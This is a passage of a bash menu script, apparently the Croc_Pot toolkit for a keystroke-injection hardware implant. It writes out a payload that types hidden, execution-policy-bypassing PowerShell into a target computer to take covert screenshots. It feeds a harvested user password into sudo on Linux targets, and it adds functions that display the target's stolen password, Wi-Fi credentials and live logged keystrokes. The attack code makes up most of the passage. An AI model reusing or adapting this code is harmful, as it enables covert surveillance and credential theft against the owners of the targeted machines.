	echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocshot\n\n#---> Check for save passwd run CrocUnlock first if not edit below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
else\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n\nif [ -d /root/udisk/loot/Croc_pot/screenshot ]; then\n	LED B\nelse\n	mkdir /root/udisk/loot/Croc_pot/screenshot\nfi\n\nWINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\nOS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\nHOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\n	if [ -e \"\${WINDS_SHOT}\" ]; then
	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\nelse\n	LED ATTACK
echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_pot\screenshot\\\\\\\\\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\\\"\\\n\nAdd-Type -AssemblyName System.Windows.Forms\\\nAdd-type -AssemblyName System.Drawing\\\n\n\\\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\\\n\\\$Width = \\\$Screen.Width\\\n
\\\$Height = \\\$Screen.Height\\\n\\\$Left = \\\$Screen.Left\\\n\\\$Top = \\\$Screen.Top\\\n\\\$screenshotImage = New-Object System.Drawing.Bitmap \\\$Width, \\\$Height\\\n\n\\\$graphicObject = [System.Drawing.Graphics]::FromImage(\\\$screenshotImage)\\\n\\\$graphicObject.CopyFromScreen(\\\$Left, \\\$Top, 0, 0, \\\$screenshotImage.Size)\\\n
\\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q GUI d\n	sleep 1\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER
	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	Q ALT-TAB\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH ;;\nparrot)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"
	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10
	ATTACKMODE HID\n	LED FINISH;;\n*)\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH;;\n esac\nfi" >> ${Croc_Shot} ;;
[nN] | [nN][oO])
	echo -ne "$(ColorYellow 'Maybe next time')\n";;
*)
	invalid_entry ; screen_shot ;;
esac
fi
##
#----Croc_Shot take pic now function
##
read_all TAKE SCREENSHOT NOW OF TARGET PC Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
		ATTACKMODE HID STORAGE
		local WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
		if [ "$(OS_CHECK)" = WINDOWS ]; then
		if [ -e "${WINDS_SHOT}" ]; then
		Q GUI r
		sleep 1
		Q STRING "powershell -nop -ex Bypass -w Hidden"
		Q ENTER
		sleep 1
		Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
		Q ENTER
		sleep 1
		Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')"
		Q ENTER
		sleep 5
		Q STRING "exit"
		Q ENTER
		ATTACKMODE HID
		else
		echo -ne "\$outputFile = \"\$Croc\loot\Croc_pot\screenshot\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\"\n
Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawing\n
\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\$Width = \$Screen.Width\n
\$Height = \$Screen.Height\n\$Left = \$Screen.Left\n\$Top = \$Screen.Top\n\$screenshotImage = New-Object System.Drawing.Bitmap \$Width, \$Height\n
\$graphicObject = [System.Drawing.Graphics]::FromImage(\$screenshotImage)\n\$graphicObject.CopyFromScreen(\$Left, \$Top, 0, 0, \$screenshotImage.Size)\n
\$screenshotImage.Save(\$outputFile)\nWrite-Output \"Saved to:\"\nWrite-Output \$outputFile\nStart-Sleep -s 5" >> ${WINDS_SHOT}
		Q GUI r
		sleep 1
		Q STRING "powershell -nop -ex Bypass -w Hidden"
		Q ENTER
		sleep 1
		Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
		Q ENTER
		sleep 1
		Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')"
		Q ENTER
		sleep 5
		Q STRING "exit"
		Q ENTER
		ATTACKMODE HID
	fi
else
	case $HOST_CHECK in
	raspberrypi)
		sleep 1
		Q ALT-F4
		Q GUI d
		sleep 1
		Q STRING "LXTerminal"
		Q ENTER
		Q ENTER
		sleep 1
		Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \${PC_PIC} &>/dev/null & exit"
		Q ENTER
		Q ALT-TAB
		Q ALT-TAB
		sleep 10
		ATTACKMODE HID ;;
	parrot)
		Q ALT F2
		sleep 1
		Q STRING "mate-terminal"
		Q ENTER
		sleep 1
		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
		Q ENTER
		sleep 3
		Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"
		Q ENTER
		sleep 1
		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
		Q ENTER
		Q ALT-TAB
		sleep 10
		ATTACKMODE HID ;;
		*)
		Q ALT F2
		sleep 1
		Q STRING "xterm"
		Q ENTER
		sleep 1
		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
		Q ENTER
		sleep 3
		Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"
		Q ENTER
		sleep 1
		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
		Q ENTER
		Q ALT-TAB
		sleep 10
		ATTACKMODE HID ;;
	esac
fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; screen_shot ;;
esac
}
##
#----Install Payloads Menu
##
MenuTitle INSTALL PAYLOADS MENU
MenuColor 1 GETONLINE PAYLOAD ; echo -ne "    ${clear}\n"
MenuColor 2 CROCUNLOCK PAYLOAD ; echo -ne "   ${clear}\n"
MenuColor 3 WIFI SETUP PAYLOAD ; echo -ne "   ${clear}\n"
MenuColor 4 QUICK START CROC_POT ; echo -ne " ${clear}\n"
MenuColor 5 CROCSHOT PAYLOAD ; echo -ne "     ${clear}\n"
MenuColor 6 RETURN TO MAIN MENU ; echo -ne "  ${clear}\n"
MenuEnd
	case $m_a in
	1) get_online_p ; install_payloads ;;
	2) croc_unlock_p ; install_payloads ;;
	3) wifi_setup_p ; install_payloads ;;
	4) quick_croc_pot ; install_payloads ;;
	5) screen_shot ; install_payloads ;;
	6) main_menu ;;
	0) exit 0 ;;
	[bB]) menu_B ;;
	*) invalid_entry ; install_payloads ;;
	esac
}
##
#----Croc Pot Plus Menu
##
menu_B() {
	LED B
MenuTitle CROC POT PLUS MENU
MenuColor 1 RECON SCAN ; echo -ne "          ${clear}\n"
MenuColor 2 KEYSTORKES LAPTOP ; echo -ne "   ${clear}\n"
MenuColor 3 WINDOWS INFO SCAN ; echo -ne "   ${clear}\n"
MenuColor 4 CROC VPN SETUP ; echo -ne "      ${clear}\n"
MenuColor 5 PASS TIME GAMES ; echo -ne "     ${clear}\n"
MenuColor 6 WINDOWS DEFENDER ; echo -ne "    ${clear}\n"
MenuColor 7 INSTALL PAYLOADS ; echo -ne "    ${clear}\n"
MenuColor 8 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) croc_recon ; menu_B ;;
	2) keystorkes_laptop ; menu_B ;;
	3) windows_check ; menu_B ;;
	4) croc_vpn ; menu_B ;;
	5) pass_time ; menu_B ;;
	6) windows_defender ; menu_B ;;
	7) install_payloads ; menu_B ;;
	8) main_menu ;;
	0) exit 0 ;;
	[bB]) main_menu ;;
	*) invalid_entry ; menu_B ;;
	esac
 }
menu_B
}
##
#----Croc status menu/functions
##
function croc_status() {
##
#----SSH Install screenfetch 
##
	install_package screenfetch SCREENFETCH croc_status
##
#----SSH Display screenfetch 
##
echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n"
screenfetch 2> /dev/null
echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
local server_name=$(hostname)
memory_check() {
	clear
	echo -ne "\n$(ColorYellow 'Memory usage on') ${server_name} is:\n"
	egrep --color=auto 'Mem|Cache|Swap' /proc/meminfo
	free -t -m
	cat /proc/meminfo
	vmstat
	df -h
	iostat
}
cpu_check() {
	clear
	echo -ne "\n$(ColorYellow 'CPU load on') ${server_name} is:\n"
	more /proc/cpuinfo && lscpu | grep MHz --color=auto
	lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)'
	echo "Threads/core: $(nproc --all)"
	echo "Number of CPU/cores online at $HOSTNAME: $(getconf _NPROCESSORS_ONLN)"
	echo -ne "CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')"
}
tcp_check() {
	clear
	echo -ne "\n$(ColorYellow 'Network/connections on') ${server_name} is:\n"
	netstat -l ; echo ${LINE} ; netstat -r ; echo ${LINE} ; netstat -tunlp ; echo ${LINE} ; iw dev wlan0 scan
	iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort ; echo ${LINE}
	arp -a -e -v ; echo ${LINE} ; ss -p -a ; echo ${LINE} ; /sbin/ifconfig -a
}
kernel_check() {
	clear
	echo -ne "\n$(ColorYellow 'Kernel version on') ${server_name} is:\n"
	uname --all
	hostnamectl
	cat /proc/version
}
processes_check() {
	clear
	echo -ne "\n$(ColorYellow 'Running Processes') ${server_name} is:\n"
	ps -aux ; echo ${LINE} ; service --status-all ; echo ${LINE} ; findmnt -A ; echo ${LINE} ; usb-devices
}
##
#----Status KeyCroc info
##
all_checks() {
	clear
	local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
	rm -f ${LOOT_INFO}
	croc_title_loot >> ${LOOT_INFO}
echo -ne "\t${LINE_}KEYCROC INFO${LINE_}\n${LINE}\nCROC FIRMWARE: $(cat /root/udisk/version.txt)\nKEYCROC CONFIG SETTING:\n$(sed -n '/^[DWS]/p' /root/udisk/config.txt)\n${LINE}\nUSER NAME: $(whoami)\nHOSTNAME: $(cat /proc/sys/kernel/hostname)
IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nPUBLIC IP: $(curl ifconfig.co)\nMAC ADDRESS: $(ip -o link | awk '$2 != "lo:" {print $2, $(NF-2)}')\n${LINE}\nVARIABLES CURRENT USER:\n$(env)\n${LINE}\n
INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /tmp/mode)\nSSH: root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nDNS: $(sed -n -e 4p /etc/resolv.conf)\nDNS: $(sed -n -e 5p /etc/resolv.conf)\nDISPLAY ARP: $(ip n)\n${LINE}\nROUTE TALBE: $(ip r)\nNETWORK:\n$(ifconfig -a)\n${LINE}\nSYSTEM UPTIME: $(uptime)\n
SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(usb-devices)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n" >> ${LOOT_INFO}
	cat ${LOOT_INFO}
}
##
#----Status of target pc info
##
pc_info() {
	clear
	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
if [ "$(OS_CHECK)" = WINDOWS ]; then
	echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:')${green} $(OS_CHECK)
$(ColorYellow 'Target PC Host name:')${green} $(sed -n 3p ${CROC_OS})
$(ColorYellow 'Target PC Passwd:')${green} $(target_pw)
$(ColorYellow 'Target Pc user name:')${green} $(sed -n 1p ${CROC_OS_TARGET})
$(ColorYellow 'Target Pc IP:')${green} $(sed '2,6!d' ${CROC_OS_TARGET})
$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')${green}
$(sed '9,24!d' ${CROC_OS_TARGET})\n"
elif [ "$(OS_CHECK)" = LINUX ]; then
	echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:')${green} $(OS_CHECK)
$(ColorYellow 'Target PC Host name:')${green} $(sed -n 3p ${CROC_OS})
$(ColorYellow 'Target PC Passwd:')${green} $(target_pw)
$(ColorYellow 'Target Pc user name:')${green} $(sed -n 1p ${CROC_OS_TARGET})
$(ColorYellow 'Target Pc IP:')${green} $(sed -n '2,3p' ${CROC_OS_TARGET})
$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')${green} 
$(sed '4,20!d' ${CROC_OS_TARGET})${clear}\n"
else
	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET TARGET PC USER NAME AND IP')"
fi
}
##
#----Status start live keystorke
##
keystorkes_V() {
	echo -ne "\e[5m$(ColorYellow 'PRESS COMTROL + C TO EXIT')"
	sleep 2
	cd loot
	tail -f croc_char.log
	menu_A
}
##
#----Status nmon monitoring system
##
nmon_system() {
	echo -ne "$(Info_Screen '-nmon is short for Nigels performance Monitor for Linux
-More details at http://nmon.sourceforge.net/pmwiki.php')\n\n"
	install_package nmon NMON_MONITORING nmon_system croc_status
nmon
}
##
#----Status list all match words in payloads
##
list_match() {
	clear
	echo -ne "$(Info_Screen '-List all MATCH words in payloads folder
-Option to change MATCH words')\n\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	grep MATCH* /root/udisk/payloads/*.txt
elif [ "$(OS_CHECK)" = LINUX ]; then
	grep MATCH* --color=auto /root/udisk/payloads/*.txt
fi
	read_all CHANGE MATCH WORD FOR PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		read_all ENTER THE PAYLOAD NAME TO CHANGE MATCH WORD AND PRESS [ENTER]
	if [ -e "/root/udisk/payloads/${r_a}" ]; then
		R_M=$(cat /root/udisk/payloads/${r_a} | grep MATCH | awk {'print $2'})
		echo -ne "$(ColorYellow 'Current Match word is ')${green}${R_M}${clear}\n"
		echo -ne "${blue}ENTER NEW MATCH WORD AND PRESS [ENTER]:${clear}"; read m_w
		sed -i "/MATCH$/!{s/$R_M/$m_w/}" /root/udisk/payloads/${r_a}
		grep MATCH* --color=always /root/udisk/payloads/${r_a}
	else
		invalid_entry ; list_match
	fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; list_match ;;
	esac
}
##
#----Croc Status Menu
##
menu_A() {
	LED B
MenuTitle KEYCROC STATUS MENU
MenuColor 1 MEMORY USAGE ; echo -ne "               ${clear}\n"
MenuColor 2 CPU LOAD ; echo -ne "                   ${clear}\n"
MenuColor 3 NETWORK-CONNECTIONS ; echo -ne "        ${clear}\n"
MenuColor 4 KERNEL VERSION ; echo -ne "             ${clear}\n"
MenuColor 5 RUNNING PROCESSES ; echo -ne "          ${clear}\n"
MenuColor 6 CHECK ALL ; echo -ne "                  ${clear}\n"
MenuColor 7 TARGET PC INFO ; echo -ne "             ${clear}\n"
MenuColor 8 VIEW LIVE KEYSTORKES ; echo -ne "       ${clear}\n"
MenuColor 9 START NMON MONITORING ; echo -ne "      ${clear}\n"
MenuColor 10 LIST MATCH PAYLOADS WORDS ; echo -ne " ${clear}\n"
MenuColor 11 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
MenuEnd
	case $m_a in
	1) memory_check ; menu_A ;;
	2) cpu_check ; menu_A ;;
	3) tcp_check ; menu_A ;;
	4) kernel_check ; menu_A ;;
	5) processes_check ; menu_A ;;
	6) all_checks ; menu_A ;;
	7) pc_info ; menu_A ;;
	8) keystorkes_V ; menu_A ;;
	9) nmon_system ; menu_A ;;
	10) list_match ; menu_A ;;
	11) main_menu ;;
	0) exit 0 ;;
	[bB]) main_menu ;;
	*) invalid_entry ; menu_A ;;
	esac
 }
menu_A
}
##
#----Edit Files menu/Function
##
function croc_edit_menu() {
	clear
	LED B
	croc_title
##
#----Edit all files Function
##
edit_all() {
	cd ${*}
	ls -R --color=auto
	ls -aRd $PWD/* --color=auto
	echo ""
	read_all ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]
if [ -e "${r_a}" ]; then
	nano ${r_a}
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----Edit Config files Function
##
edit_config() {
if [ -e "/root/udisk/config.txt" ]; then
	nano /root/udisk/config.txt
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----Edit remove file Function
##
remove_file() {
	cd
	ls -aRd $PWD/* --color=auto
	ls -R --color=auto
	echo ""
	read_all ENTER THE PATH TO FILE NAME YOU WISH TO REMOVE AND PRESS [ENTER]
if [ -e "${r_a}" ]; then
	LED R
	echo -ne ${LINE_}"\e[5m$(ColorRed 'This file will be removed') ${r_a}"${LINE_}
	rm -f ${r_a}
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----midnight commander, visual file manager
##
midnight_manager() {
	clear
	echo -ne "$(Info_Screen '-GNU Midnight Commander is a visual file manager
-More details at https://midnight-commander.org')\n"
##
#----midnight install function
##
mc_install() {
	install_package mc MIDNIGHT_COMMANDER mc_install croc_edit_menu
}
##
#----midnight remove function
##
mc_remove() {
	read_all REMOVE MIDNIGHT COMMANDER Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		apt-get remove mc
		apt-get autoremove
		echo -ne "\n$(ColorGreen 'MIDNIGHT COMMANDER IS NOW REMOVED')\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'KEEPING MIDNIGHT COMMANDER')\n" ;;
	*)
		invalid_entry ; mc_remove ;;
	esac
}
##
#----midnight Menu
##
MenuTitle MIDNIGHT COMMANDER MENU
MenuColor 1 INSTALL MIDNIGHT COMMANDER ; echo -ne " ${clear}\n"
MenuColor 2 REMOVE MIDNIGHT COMMANDER ; echo -ne "  ${clear}\n"
MenuColor 3 START MIDNIGHT COMMANDER ; echo -ne "   ${clear}\n"
MenuColor 4 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
MenuEnd
	case $m_a in
	1) mc_install ; midnight_manager ;;
	2) mc_remove ; midnight_manager ;;
	3) mc ; midnight_manager ;;
	4) main_menu ;;
	0) exit 0 ;;
	[bB]) croc_edit_menu ;;
	*) invalid_entry ; midnight_manager ;;
	esac
}
##
#----Edit insert QUACK command
##
insert_quack() {
	clear
	echo -ne "$(Info_Screen '-This will open Target pc terminal
-Insert Quack command
-Example enter echo "hello world"
-hello world should display in terminal and exit')\n\n"
	echo -ne "${yellow}Target pc OS is: $(OS_CHECK)\n"
	read_all INSERT QUACK COMMAND Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
if [ "$(OS_CHECK)" = WINDOWS ]; then
	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "${r_a}"
	Q ENTER 
	sleep 5
	Q STRING "exit"
	Q ENTER
	Q ALT-TAB
else
case $HOST_CHECK in
raspberrypi)
	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "${r_a}"
	Q ENTER 
	sleep 5
	Q STRING "exit"
	Q ENTER
	Q ALT-TAB ;;
parrot)
	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "${r_a}"
	Q ENTER 
	sleep 5
	Q STRING "exit"
	Q ENTER
	Q ALT-TAB ;;
*)
	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "${r_a}"
	Q ENTER 
	sleep 5
	Q STRING "exit"
	Q ENTER
	Q ALT-TAB ;;
esac
fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; insert_quack ;;
esac
}
##
#----Croc Edit Menu
##
	LED B
MenuTitle CROC EDIT MENU
MenuColor 1 CROC PAYLOADS FOLDER ; echo -ne "   ${clear}\n"
MenuColor 2 CROC TOOLS FOLDER ; echo -ne "      ${clear}\n"
MenuColor 3 CROC LOOT FOLDER ; echo -ne "       ${clear}\n"
MenuColor 4 CROC CONFIG FILE ; echo -ne "       ${clear}\n"
MenuColor 5 CROC ENTER FILE NAME ; echo -ne "   ${clear}\n"
MenuColor 6 CROC REMOVE FILES ; echo -ne "      ${clear}\n"
MenuColor 7 ATTACKMODE HID STORAGE ; echo -ne " ${clear}\n"
MenuColor 8 ATTACKMODE HID ; echo -ne "         ${clear}\n"
MenuColor 9 RELOAD_PAYLOADS ; echo -ne "        ${clear}\n"
MenuColor 10 MIDNIGHT MANAGER ; echo -ne "      ${clear}\n"
MenuColor 11 QUACK COMMAND ; echo -ne "         ${clear}\n"
MenuColor 12 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
MenuEnd
	case $m_a in
	1) edit_all /root/udisk/payloads ; croc_edit_menu ;;
	2) edit_all /root/udisk/tools ; croc_edit_menu ;;
	3) edit_all /root/udisk/loot ; croc_edit_menu ;;
	4) edit_config ; croc_edit_menu ;;
	5) edit_all ; croc_edit_menu ;;
	6) remove_file ; croc_edit_menu ;;
	7) ATTACKMODE HID STORAGE ; croc_edit_menu ;;
	8) ATTACKMODE HID ; croc_edit_menu ;;
	9) RELOAD_PAYLOADS ; croc_edit_menu ;;
	10) midnight_manager ; croc_edit_menu ;;
	11) insert_quack ; croc_edit_menu ;;
	12) main_menu ;;
	0) exit 0 ;;
	[bB]) main_menu ;;
	*) invalid_entry ; croc_edit_menu ;;
	esac
}
##
#----SSH menu/function
##
function ssh_menu() {
	LED B
	clear
##
#----SSH Install sshpass 
##
	install_package sshpass SSHPASS ssh_menu 
#
# Validate IP v4 or v6 address and start ssh to hak5 device
#
ip_check_ssh() {
if [[ "${r_a}" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[